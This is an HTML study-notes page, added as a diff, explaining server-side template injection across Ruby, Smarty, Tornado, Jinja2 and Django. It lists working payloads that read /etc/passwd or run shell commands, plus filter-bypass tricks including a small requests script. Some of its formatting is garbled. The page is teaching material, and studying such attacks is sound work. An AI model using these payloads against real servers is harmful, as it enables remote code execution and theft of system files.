@@ -1,0 +1,224 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en-US" data-content_root="../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Template injection &mdash; Web Security Study Notes 1.0 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=fa44fd50" />
+      <link rel="stylesheet" type="text/css" href="../_static/css/theme.css?v=e59714d7" />
+
+  
+      <script src="../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../_static/documentation_options.js?v=4042127e"></script>
+      <script src="../_static/doctools.js?v=9bcbadda"></script>
+      <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../index.html" class="icon icon-home">
+            Web Security Study Notes
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Content index:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../basic/index.html">1. Introduction</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../network/index.html">2. Computer network and protocol</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../info/index.html">3. Information collection</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../language/index.html">4. Language and framework</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../intranet/index.html">5. Intranet penetration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../cloud/index.html">6. Cloud Security</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../defense/index.html">7. Defense Technology</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../auth/index.html">8. Authentication mechanism</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../tools/index.html">9. Tools and resources</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../manual/index.html">10. Quick manual check</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/index.html">11. other</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">Web Security Study Notes</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">Template injection</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../_sources/vuln/ssti.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="template-injection">
+<h1>Template injection<a class="headerlink" href="#template-injection" title="Link to this heading"></a></h1>
+<section id="introduction">
+<h2>Introduction<a class="headerlink" href="#introduction" title="Link to this heading"></a></h2>
+<p>The template engine is used to render content using dynamic data. This context data is usually controlled by the user and formatted by the template to generate web pages, emails, etc. The template engine allows powerful language expressions to be used in templates to present dynamic content by processing context data using code constructs (such as conditional statements, loops, etc.). If an attacker has control over the template to be rendered, they will be able to inject expressions that expose context data, or even run arbitrary commands on the server.</p>
+</section>
+<section id="test-method">
+<h2>Test Method<a class="headerlink" href="#test-method" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>Determine the engine used</p></li>
+<li><p>View engine-related documentation to determine its security mechanism and its own functions and variables</p></li>
+<li><p>Need to find the attack surface and try to attack</p></li>
+</ul>
+</section>
+<section id="test-cases">
+<h2>Test cases<a class="headerlink" href="#test-cases" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>Simple mathematical expression, <code class="docutils literal notranslate"><span class="pre">{{</span> <span class="pre">7+7</span> <span class="pre">}}</span> <span class="pre">=&gt;</span> <span class="pre">14</span></code></p></li>
+<li><p>String expression <code class="docutils literal notranslate"><span class="pre">{{</span> <span class="pre">&quot;ajin&quot;</span> <span class="pre">}}</span> <span class="pre">=&gt;</span> <span class="pre">ajin</span></code></p></li>
+<li><p>Ruby</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;%=</span> <span class="pre">7</span> <span class="pre">*</span> <span class="pre">7</span> <span class="pre">%&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;%=</span> <span class="pre">File.open('/etc/passwd').read</span> <span class="pre">%&gt;</span></code></p></li>
+<li><p>Java</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">${7*7}</span></code></p></li>
+<li><p>Twig</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">{{7*7}}</span></code></p></li>
+<li><p>Smarty</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">{php}echo</span> <span class="pre">`id`;{/php}</span></code></p></li>
+<li><p>AngularJS</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">$eval('1+1')</span></code></p></li>
+<li><p>Tornado</p></li>
+<li><p>Reference module <code class="docutils literal notranslate"><span class="pre">{%</span> <span class="pre">import</span> <span class="pre">module</span> <span class="pre">%}</span></code></p></li>
+<li><p>=&gt; <code class="docutils literal notranslate"><span class="pre">{%</span> <span class="pre">import</span> <span class="pre">os</span> <span class="pre">%}{{</span> <span class="pre">os.popen(&quot;whoami&quot;).read()</span> <span class="pre">}}</span></code></p></li>
+<li><p>Flask/Jinja2</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">{{</span> <span class="pre">config</span> <span class="pre">}}</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">{{</span> <span class="pre">config.items()</span> <span class="pre">}}</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">{{get_flashed_messages.__globals__['current_app'].config}}</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">{{''.__class__.__mro__[-1].__subclasses__()}}</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">{{</span> <span class="pre">url_for.__globals__['__builtins__'].__import__('os').system('ls')</span> <span class="pre">}}</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">{{</span> <span class="pre">request.__init__.__globals__['__builtins__'].open('/etc/passwd').read()</span> <span class="pre">}}</span></code></p></li>
+<li><p>Django</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">{{</span> <span class="pre">request</span> <span class="pre">}}</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">{%</span> <span class="pre">debug</span> <span class="pre">%}</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">{%</span> <span class="pre">load</span> <span class="pre">module</span> <span class="pre">%}</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">{%</span> <span class="pre">include</span> <span class="pre">&quot;x.html&quot;</span> <span class="pre">%}</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">{%</span> <span class="pre">extends</span> <span class="pre">&quot;x.html&quot;</span> <span class="pre">%}</span></code></p></li>
+</ul>
+</section>
+<section id="target">
+<h2>Target<a class="headerlink" href="#target" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>Create an object</p></li>
+<li><p>File reading and writing</p></li>
+<li><p>Remote file contains</p></li>
+<li><p>Information leakage</p></li>
+<li><p>Elevation of Rights</p></li>
+</ul>
+</section>
+<section id="related-attributes">
+<h2>Related attributes<a class="headerlink" href="#related-attributes" title="Link to this heading"></a></h2>
+<section id="class">
+<h3><code class="docutils literal notranslate"><span class="pre">__class__</span></code><a class="headerlink" href="#class" title="Link to this heading"></a></h3>
+<p>New classes in python (i.e. classes that display inheriting object objects) have a property <code class="docutils literal notranslate"><span class="pre">__class__</span></code> used to get the corresponding class of the current instance, such as <code class="docutils literal notranslate"><span class="pre">&quot;&quot;.__class__</span></code> to get the corresponding class of the string instance. kind</p>
+</section>
+<section id="mro">
+<h3><code class="docutils literal notranslate"><span class="pre">__mro__</span></code><a class="headerlink" href="#mro" title="Link to this heading"></a></h3>
+<p>The <code class="docutils literal notranslate"><span class="pre">__mro__</span></code> property of a class object in python will return a tuple object, which contains all the inherited base classes of the current class object. The order of elements in the tuple is the order found by MRO (Method Resolution Order).</p>
+</section>
+<section id="globals">
+<h3><code class="docutils literal notranslate"><span class="pre">__globals__</span></code><a class="headerlink" href="#globals" title="Link to this heading"></a></h3>
+<p>All global variables of the function are saved. In use, you can use <code class="docutils literal notranslate"><span class="pre">__init__</span></code> to get the object’s function and obtain the <code class="docutils literal notranslate"><span class="pre">file`````</span></code>, etc. modules such as <a href="#id1"><span class="problematic" id="id2">``</span></a>`` to proceed to the next step. use</p>
+</section>
+<section id="subclasses">
+<h3><code class="docutils literal notranslate"><span class="pre">__subclasses__()</span></code><a class="headerlink" href="#subclasses" title="Link to this heading"></a></h3>
+<p>Python’s new class retains references to all its subclasses. The <a href="#id3"><span class="problematic" id="id4">``</span></a>__subclasses__()` method returns references to all the living subclasses of the class (a class object reference, not an instance).</p>
+<p>Because all classes in python inherit object, you can get the object of the desired class by calling the <code class="docutils literal notranslate"><span class="pre">__subclasses__()</span></code> method of the object class object.</p>
+</section>
+</section>
+<section id="common-payloads">
+<h2>Common Payloads<a class="headerlink" href="#common-payloads" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(&quot;os&quot;).popen(&quot;ls</span> <span class="pre">/&quot;).read()'</span> <span class="pre">)</span></code></p></li>
+</ul>
+</section>
+<section id="bypassing-tips">
+<h2>Bypassing Tips<a class="headerlink" href="#bypassing-tips" title="Link to this heading"></a></h2>
+<section id="string-stitching">
+<h3>String stitching<a class="headerlink" href="#string-stitching" title="Link to this heading"></a></h3>
+<p><code class="docutils literal notranslate"><span class="pre">request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]</span></code></p>
+</section>
+<section id="bypass-using-parameters">
+<h3>Bypass using parameters<a class="headerlink" href="#bypass-using-parameters" title="Link to this heading"></a></h3>
+<p>params = {
+‘clas’: ‘__class__’,
+‘mr’: ‘__mro__’,
+‘subc’: ‘__subclasses__’
+}
+data = {
+“data”: “{{‘’[request.args.clas][request.args.mr][1][request.args.subc]()}}”
+}
+r = requests.post(url, params=params, data=data)
+print(r.text)</p>
+</section>
+</section>
+<section id="reference-link">
+<h2>Reference link<a class="headerlink" href="#reference-link" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://zhuanlan.zhihu.com/p/28823933">Server-side template injection</a></p></li>
+<li><p><a class="reference external" href="http://blog.knownsec.com/2016/02/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/">Execute arbitrary code with Python features</a></p></li>
+</ul>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2025-2025, Lyle.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
